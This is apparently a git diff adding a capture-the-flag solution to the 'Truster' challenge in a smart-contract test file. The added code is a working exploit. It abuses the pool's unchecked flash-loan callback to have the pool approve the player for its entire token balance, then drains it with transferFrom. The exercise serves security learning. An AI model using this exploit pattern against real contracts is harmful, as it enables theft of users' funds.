@@ -23,6 +23,21 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        //// Create data
+        let ABI = ["function approve(address spender,uint256 amount)"];
+        let iface = new ethers.utils.Interface(ABI);
+        let amount = await token.balanceOf(pool.address);
+        let data = iface.encodeFunctionData("approve", [player.address, amount]);
+        //// flash loan and call to give allownace for the attacker
+        await pool.connect(player).flashLoan(
+            100,
+            pool.address,
+            token.address,
+            data
+        );
+        //after exploited
+        console.log(`allowanc(pool, player): ${await token.allowance(pool.address, player.address)}`);
+        await token.connect(player).transferFrom(pool.address, player.address, amount);
     });
 
     after(async function () {
